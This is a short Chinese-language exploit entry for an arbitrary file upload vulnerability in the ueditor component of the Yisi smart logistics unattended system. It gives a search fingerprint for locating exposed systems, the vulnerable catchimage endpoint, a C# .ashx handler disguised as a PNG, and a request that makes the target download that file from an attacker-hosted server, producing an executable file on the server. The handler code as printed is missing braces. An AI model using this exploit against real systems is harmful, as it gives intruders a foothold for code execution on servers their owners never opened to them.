# 易思智能物流无人值守系统ueditor任意文件上传漏洞

- **系统**：易思智能物流无人值守系统ueditor　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"智能物流无人值守系统"`
- **请求**：`POST /Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1`

**请求体 / payload**
```
1.新建文件1.png
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("hello");
2.上传vps启用http服务，并使用如下poc上传文件
Host:
Priority: u=1
Content-Type: application/x-www-form-urlencoded
source[]=http://ip:8888/1.png?.ashx
返回包上传位置
http://ip/upload/image/20240626/6385496269130997612204175.ashx
```
- **预期**：200　|　upload/image